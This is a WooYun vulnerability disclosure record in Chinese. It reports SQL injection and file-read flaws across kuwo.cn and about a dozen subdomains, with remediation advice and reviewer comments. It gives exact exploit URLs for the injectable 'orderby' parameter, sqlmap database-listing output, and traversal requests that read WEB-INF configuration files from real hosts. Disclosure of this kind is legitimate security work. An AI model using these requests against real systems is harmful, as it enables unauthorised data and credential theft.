{"id": 88143, "wybug_id": "wooyun-2016-0221469", "wybug_title": "酷我主站及十多个分站SQL注入+文件读取                                      ", "wybug_corp": "酷我音乐", "wybug_author": "pandas", "wybug_date": "2016-06-21 16:06", "wybug_open_date": "2016-06-27 09:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-21：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 酷我主站及10+个分站SQL注入+文件读取，打个包。 详细说明：  漏洞站点统计：\nhttp://yule.kuwo.cn/http://kappa.kuwo.cn/http://huodong.kuwo.cn/http://album.kuwo.cn/http://playlist.kuwo.cn/http://play.kuwo.cn/http://changba.kuwo.cn/http://www.kuwo.cn/http://tupian.kuwo.cn/http://hbtv.kuwo.cn/http://gxtv.kuwo.cn/http://yinyue.kuwo.cn/\n目前搜集到以上连主站共12个站点受影响，可能还有遗漏。一.SQL注入：http://www.kuwo.cn/huodong/wanmei/xianglong/getAllWork?orderby=flowers&huodongName=wanmeixianglong&curpager=1漏洞参数:orderbySQLMAP可跑数据：\n\n涉及21个数据库：\navailable databases [21]:[*] ACT[*] BELL[*] Cafe[*] CONCERT[*] CROWD_FUNDING[*] information_schema[*] KGE[*] KGE_ACT[*] KGECOMMENT[*] KW_TV[*] LISTEN_STORY[*] MANYOU[*] mysql[*] NEWS[*] performance_schema[*] RESWIKI[*] SPEAKER[*] statistics[*] TAOBAO[*] test[*] YAHOO\n其余的站点都可以用sqlmap跑数据，漏洞点相同，附一张SQLMAP证明：\n\n   漏洞证明：  二、文件读取这是一个历史问题，之前也有白帽子提交过，但厂商一直修复不好。主站：http://www.kuwo.cn/huodong/st/ActCommentsNewFromDB?dis=/WEB-INF/web.xml?&pn=0&subid=142\n\nhttp://www.kuwo.cn/huodong/st/ActCommentsNewFromDB?dis=/WEB-INF/classes/config.properties?&pn=0&subid=142\n\nhttp://www.kuwo.cn/huodong/st/ActCommentsNewFromDB?dis=/WEB-INF/classes/log4j.properties?&pn=0&subid=142\n\n同理：其他的分站点也存在该处文件读取漏洞，厂商还是抓紧修复下。   修复方案：  1. SQL注入：orderby参数严格过滤；2. 文件读取：结合该功能点，判断是否跨越目录读取文件。或者用笨方法，判断好 ../  、 WEB-INF   、 jsp$（jsp结尾)等文件不可读即可。   版权声明：转载请注明来源 pandas@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-06-27 09:39 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-06-21 16:15 |    \t\t方大核桃 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:59        | 要怎么长大,才能赢过时间啊)\t\t \n  昨天扫描器刚扫过...一无所获...尴尬...    \n     2016-06-21 16:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:22        | 当我又回首一切,这个世界会好吗?)\t\t \n  @方大核桃 尴尬    \n     2016-06-21 16:25 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:678 漏洞数:136        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  @方大核桃 众人拾柴火焰高    \n     2016-06-21 16:33 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:318 漏洞数:34        | 求团队收留。)\t\t \n  @方大核桃 尴尬    \n     2016-06-21 16:35 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:780 漏洞数:158        | going)\t\t \n  刚扫过的路过~好尴尬    \n     2016-06-21 16:36 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:735 漏洞数:85        | 国家特级保护动物)\t\t \n  你们都好厉害啊，都有扫描器。    \n     2016-06-21 16:53 |    \t\tnull_z \t\t\t( 普通白帽子  |\t\t\t        Rank:1012 漏洞数:115        )\t\t \n  @方大核桃  sqlmapapi？？    \n     2016-06-21 20:00 |    \t\t方大核桃 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:59        | 要怎么长大,才能赢过时间啊)\t\t \n  @null_z 自己写的url采集规则 检测使用的sqlmap    \n     2016-06-21 23:55 |    \t\tbigric3 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:6        | http://0day.websaas.com.cn/)\t\t \n  想知道我天哥在哪找的点    \n     2016-06-27 09:51 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:419 漏洞数:110        | 17岁的毛孩有些厂商故意加你好友，和你聊...)\t\t \n  洞主你是酷我杀手    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}